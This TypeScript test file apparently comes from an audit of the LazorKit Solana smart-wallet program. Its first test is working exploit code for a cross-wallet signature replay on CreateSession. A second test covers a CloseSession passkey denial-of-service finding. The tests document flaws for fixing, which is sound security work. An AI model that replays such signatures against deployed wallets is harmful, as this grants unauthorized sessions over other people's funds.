/**
 * 09-security-config.test.ts
 *
 * Demonstrates the critical security flaws found in the Config & Fee audit:
 * 1. Cross-Wallet Signature Replay on CreateSession (and others)
 * 2. CloseSession Denial of Service for Secp256r1 Passkeys
 */

import { Keypair, PublicKey } from "@solana/web3.js";
import { describe, it, expect, beforeAll } from "vitest";
import {
    findVaultPda,
    findAuthorityPda,
    findSessionPda,
    AuthType,
    Role,
} from "@lazorkit/solita-client";
import { setupTest, sendTx, getRandomSeed, tryProcessInstruction, tryProcessInstructions, type TestContext, getSystemTransferIx, PROGRAM_ID } from "./common";

describe("Security Vulnerabilities - Config & Fee Extension", () => {
    let ctx: TestContext;

    beforeAll(async () => {
        ctx = await setupTest();
    });

    it("Exploit: Cross-Wallet Replay Attack on CreateSession (Ed25519 Relayer)", async () => {
        // Alice creates Wallet A
        const alice = Keypair.generate();
        const { ix: ixA, walletPda: walletA } = await ctx.highClient.createWallet({
            payer: ctx.payer,
            authType: AuthType.Ed25519,
            owner: alice.publicKey
        });
        await sendTx(ctx, [ixA]);

        // Alice creates Wallet B with the SAME key
        const { ix: ixB, walletPda: walletB } = await ctx.highClient.createWallet({
            payer: ctx.payer,
            authType: AuthType.Ed25519,
            owner: alice.publicKey
        });
        await sendTx(ctx, [ixB]);

        expect(walletA.toBase58()).not.toEqual(walletB.toBase58());

        // Alice authorizes a session for Wallet A using a Relayer (payer)
        const sessionKey = Keypair.generate();
        const relayer = Keypair.generate();
        // pre-fund relayer
        await sendTx(ctx, [getSystemTransferIx(ctx.payer.publicKey, relayer.publicKey, 2_000_000_000n)]);

        // alice authority funding for rent safety
        const [aliceAuthPda] = findAuthorityPda(walletA, alice.publicKey.toBytes());
        await sendTx(ctx, [getSystemTransferIx(ctx.payer.publicKey, aliceAuthPda, 100_000_000n)]);

        // manual funding Session PDA to satisy simulator rent check
        const [sessionPdaData] = findSessionPda(walletA, sessionKey.publicKey);
        await sendTx(ctx, [getSystemTransferIx(ctx.payer.publicKey, sessionPdaData, 100_000_000n)]);

        const { ix: createSessionIxA } = await ctx.highClient.createSession({
            payer: relayer,
            adminType: AuthType.Ed25519,
            adminSigner: alice, // Alice signs the PDA payload
            sessionKey: sessionKey.publicKey,
            expiresAt: BigInt(Date.now() + 10000000),
            walletPda: walletA
        });

        // The transaction goes through successfully for Wallet A!
        await sendTx(ctx, [createSessionIxA], [relayer, alice]);

        const [sessionPdaA] = findSessionPda(walletA, sessionKey.publicKey);
        const accInfoA = await ctx.connection.getAccountInfo(sessionPdaA);
        expect(accInfoA).not.toBeNull();

        // THE EXPLOIT:
        // The Relayer (attacker) takes Alice's signature from `createSessionIxA` 
        // and replays it exactly on Wallet B, which Alice also owns.
        // Because the payload ONLY hashes [payer.key, session_key], it does NOT bind to Wallet A!
        const { ix: createSessionIxB } = await ctx.highClient.createSession({
            payer: relayer, // Same relayer
            adminType: AuthType.Ed25519,
            adminSigner: alice, // We need the structure, but we'll swap the signature
            sessionKey: sessionKey.publicKey, // Same session key
            expiresAt: BigInt(Date.now() + 10000000), // Same expiry
            walletPda: walletB // DIFFERENT WALLET!
        });

        // We simulate the replay by having Alice sign (since she uses the same key).
        // If this was a raw tx interception, the attacker would just take the signature bytes.
        // Since Vitest signs using the Keypair, it generates the same valid signature
        // that the attacker would have intercepted!
        const result = await tryProcessInstruction(ctx, [createSessionIxB], [relayer, alice]);

        // This SHOULD FAIL because Alice never intended to authorize Wallet B.
        // But because of the vulnerability, it SUCCEEDS!
        
        const [sessionPdaB] = findSessionPda(walletB, sessionKey.publicKey);
        const accInfoB = await ctx.connection.getAccountInfo(sessionPdaB);

        // Expose the vulnerability
        expect(accInfoB).not.toBeNull();
    }, 30000);

    it("Bug: CloseSession Passkey DoS", async () => {
        const { generateMockSecp256r1Signer, buildAuthPayload, buildSecp256r1Message, buildSecp256r1PrecompileIx, buildAuthenticatorData, readCurrentSlot, appendSecp256r1Sysvars } = await import("./secp256r1Utils");

        // 1. Setup Wallet with Ed25519 owner (Alice)
        const alice = Keypair.generate();
        const { ix: ixA, walletPda: walletA, authorityPda: aliceAuthPda } = await ctx.highClient.createWallet({
            payer: ctx.payer,
            authType: AuthType.Ed25519,
            owner: alice.publicKey
        });
        await sendTx(ctx, [ixA]);

        // 2. Alice adds a Secp256r1 Admin (Bob)
        const bob = await generateMockSecp256r1Signer();
        const [bobAuthPda] = findAuthorityPda(walletA, bob.credentialIdHash);
        const { ix: ixAddSecp } = await ctx.highClient.addAuthority({
            payer: ctx.payer,
            adminType: AuthType.Ed25519,
            adminSigner: alice,
            newAuthPubkey: bob.publicKeyBytes,
            newAuthType: AuthType.Secp256r1,
            role: Role.Admin,
            walletPda: walletA,
            newCredentialHash: bob.credentialIdHash
        });
        await sendTx(ctx, [ixAddSecp], [alice]);

        // 3. Create a Session account
        const sessionKey = Keypair.generate();
        const [sessionPda] = findSessionPda(walletA, sessionKey.publicKey);
        const { ix: ixCreateSession } = await ctx.highClient.createSession({
            payer: ctx.payer,
            adminType: AuthType.Ed25519,
            adminSigner: alice,
            sessionKey: sessionKey.publicKey,
            walletPda: walletA
        });
        await sendTx(ctx, [ixCreateSession], [alice]);

        // 4. Bob (Secp256r1) attempts to close the session
        const closeSessionIx = await ctx.highClient.closeSession({
            payer: ctx.payer,
            walletPda: walletA,
            sessionPda: sessionPda,
        });

        closeSessionIx.keys = [
            { pubkey: ctx.payer.publicKey, isSigner: true, isWritable: true },
            { pubkey: walletA, isSigner: false, isWritable: false },
            { pubkey: sessionPda, isSigner: false, isWritable: true },
            { pubkey: ctx.highClient.getConfigPda(), isSigner: false, isWritable: false },
            { pubkey: bobAuthPda, isSigner: false, isWritable: true }
        ];

        // Tweak direct keys or structure if needed
        const adminMeta = closeSessionIx.keys.find(k => k.pubkey.equals(bobAuthPda));
        if (adminMeta) adminMeta.isWritable = true;

        const { ix: ixWithSysvars, sysvarIxIndex, sysvarSlotIndex } = appendSecp256r1Sysvars(closeSessionIx);
        const currentSlot = await readCurrentSlot(ctx.connection);
        const authenticatorData = await buildAuthenticatorData("example.com");
        const authPayload = buildAuthPayload({ sysvarIxIndex, sysvarSlotIndex, authenticatorData, slot: currentSlot });

        // closeSession uses ONLY the session PDA for validation
        const signedPayload = sessionPda.toBytes();

        const msgToSign = await buildSecp256r1Message({
            discriminator: 8, // CloseSession uses discriminator index 8 on-chain
            authPayload, signedPayload,
            payer: ctx.payer.publicKey,
            programId: new PublicKey(PROGRAM_ID),
            slot: currentSlot,
        });

        const sysvarIx = await buildSecp256r1PrecompileIx(bob, msgToSign);

        const originalData = Buffer.from(ixWithSysvars.data);
        ixWithSysvars.data = Buffer.concat([originalData, Buffer.from(authPayload)]);

        const result = await tryProcessInstructions(ctx, [sysvarIx, ixWithSysvars]);
        expect(result.result).toBe("ok");

        const sessionInfo = await ctx.connection.getAccountInfo(sessionPda);
        expect(sessionInfo).toBeNull(); // Should be closed
    }, 30000);
});
